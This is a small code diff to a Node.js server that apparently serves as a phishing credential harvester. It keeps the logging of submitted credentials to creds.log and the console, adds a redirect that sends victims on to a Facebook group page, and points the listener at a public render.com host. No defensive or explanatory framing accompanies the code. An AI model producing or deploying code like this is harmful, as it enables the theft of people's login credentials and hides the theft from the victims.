@@ -15,9 +15,12 @@ http.createServer((req, res) => {
             
             fs.appendFile('creds.log', JSON.stringify(creds) + '\n', () => {});
             console.log('Saved:', creds);
-            res.end('Test OK');
+            res.writeHead(302, {
+                'Location': 'https://m.facebook.com/groups/2393754610988462/'
+            });
+            res.end();
         });
     } else {
         res.end('Send POST requests here');
     }
-}).listen(8000, () => console.log('Listening on http://localhost:8000'));
+}).listen(8000, () => console.log('Listening on https://listener-gsnt.onrender.com'));
